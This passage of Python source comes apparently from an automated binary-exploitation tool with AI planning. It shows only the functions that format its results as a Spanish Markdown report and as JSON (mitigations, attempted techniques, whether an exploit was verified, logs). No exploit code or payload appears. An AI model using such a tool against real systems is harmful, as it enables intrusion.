        r = "FUNCIONA" if ok is True else ("no" if ok is False else "posible")
        out.append(f"| {name} | {r} | {detail} |")
    if res.ai_conclusion:
        out.append("\n### Conclusion de la IA\n" + res.ai_conclusion)
    out.append("\n### Traza\n```\n" + "\n".join(res.log) + "\n```")
    out.append("\nTodo lo descubierto se ha guardado en la base de conocimiento (retroalimentacion).")
    return "\n".join(out)


def autopwn_to_json(res: "AutopwnResult") -> str:
    import json
    techs = [n for n, ok, _ in res.attempts if ok is True]
    return json.dumps({
        "binary": res.binary,
        "context": {"arch": res.arch, "bits": res.bits, "mitigations": res.mit,
                    "sinks": res.sinks, "has_win": res.has_win},
        "verified_findings": res.verified_findings,
        "exploit_verified": res.win_exploit,
        "rationale": (_why(res.mit, res.has_win, techs[0]) if (res.win_exploit and techs) else ""),
        "attempts": [{"technique": n, "result": ("works" if ok is True else
                     ("no" if ok is False else "possible")), "detail": d}
                     for n, ok, d in res.attempts],
        "ai_plan": res.ai_plan, "ai_conclusion": res.ai_conclusion,
        "log": res.log,
    }, indent=2)
